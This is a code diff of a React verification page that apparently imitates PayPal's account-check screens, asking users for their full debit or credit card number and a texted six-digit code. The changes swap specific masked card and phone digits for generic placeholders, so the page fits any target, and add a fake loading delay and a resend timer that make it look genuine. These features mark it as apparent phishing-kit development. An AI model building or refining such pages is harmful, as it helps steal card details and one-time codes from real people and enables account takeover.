@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { CreditCard, List, MessageSquare, Phone, Mail, ShieldCheck } from 'lucide-react';
 
 interface VerificationPageProps {
@@ -11,16 +11,32 @@ type VerificationOption = 'confirm_card' | 'security_questions' | 'paypal_app' |
 
 export function VerificationPage({ email, onBack }: VerificationPageProps) {
   const [step, setStep] = useState<VerificationStep>('choose');
+  const [loading, setLoading] = useState(false);
   const [selectedOption, setSelectedOption] = useState<VerificationOption>('confirm_card');
   const [cardNumber, setCardNumber] = useState('');
   const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
+  const [countdown, setCountdown] = useState(60);
+
+  useEffect(() => {
+    let timer: NodeJS.Timeout;
+    if (step === 'enter_code' && countdown > 0) {
+      timer = setInterval(() => {
+        setCountdown((prev) => prev - 1);
+      }, 1000);
+    }
+    return () => clearInterval(timer);
+  }, [step, countdown]);
 
   const handleNext = () => {
-    if (selectedOption === 'confirm_card') {
-      setStep('confirm_card');
-    } else if (selectedOption === 'get_text') {
-      setStep('enter_code');
-    }
+    setLoading(true);
+    setTimeout(() => {
+      setLoading(false);
+      if (selectedOption === 'confirm_card') {
+        setStep('confirm_card');
+      } else if (selectedOption === 'get_text') {
+        setStep('enter_code');
+      }
+    }, 3000);
   };
 
   const handleChooseAnother = () => {
@@ -62,7 +78,7 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
             Confirm your card number
           </h1>
           <p className="text-[16px] text-gray-900 mb-8 self-start">
-            Type in the full card number for your Visa x-••40.
+            Type in the full Debit/Credit card number
           </p>
           <div className="w-full mb-8">
             <div className="relative">
@@ -102,7 +118,7 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
             Enter the code we texted you
           </h1>
           <p className="text-[16px] text-gray-900 mb-8 self-start font-medium">
-            +1 8••-•••-••53
+            +1 •••-•••-••••
           </p>
           <div className="flex gap-2 mb-4 w-full justify-between">
             {verificationCode.map((digit, i) => (
@@ -121,7 +137,7 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
             ))}
           </div>
           <p className="text-[14px] text-gray-600 mb-8 self-start">
-            Resend code in 3 sec
+            {countdown > 0 ? `Resend code in ${countdown} sec` : 'Resend code'}
           </p>
           <button className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mb-4 shadow-sm">
             Submit
@@ -139,7 +155,23 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
   }
 
   return (
-    <div className="min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
+    <div className="relative min-h-screen w-full bg-white flex flex-col items-center font-['Inter',sans-serif]">
+      {/* Loading Overlay */}
+      {loading && (
+        <div className="absolute inset-0 z-[100] bg-white flex flex-col items-center justify-center">
+          <div className="flex flex-col items-center gap-4">
+            <div className="relative w-12 h-12">
+              <div className="absolute inset-0 border-2 border-gray-100 rounded-full"></div>
+              <div 
+                className="absolute inset-0 border-2 border-t-[#0070BA] border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"
+                style={{ animationDuration: '0.8s' }}
+              ></div>
+            </div>
+            <p className="text-[#2C2E2F] text-[18px] font-normal">Just a second...</p>
+          </div>
+        </div>
+      )}
+
       {renderTopBar()}
 
       <div className="w-full max-w-[480px] px-8 pt-12 flex flex-col items-center">
@@ -159,7 +191,7 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
             id="confirm_card"
             icon={<CreditCard className="w-6 h-6 text-gray-700" />} 
             label="Confirm your credit card number" 
-            sublabel="Visa x-••40"
+            sublabel="Visa x-••••"
             selected={selectedOption === 'confirm_card'}
             onSelect={() => setSelectedOption('confirm_card')}
           />
@@ -181,7 +213,7 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
             id="get_text"
             icon={<MessageSquare className="w-6 h-6 text-gray-700" />} 
             label="Get a text" 
-            sublabel="Mobile +1 8••-•••-••53"
+            sublabel="Mobile +1 •••-•••-••••"
             selected={selectedOption === 'get_text'}
             onSelect={() => setSelectedOption('get_text')}
           />
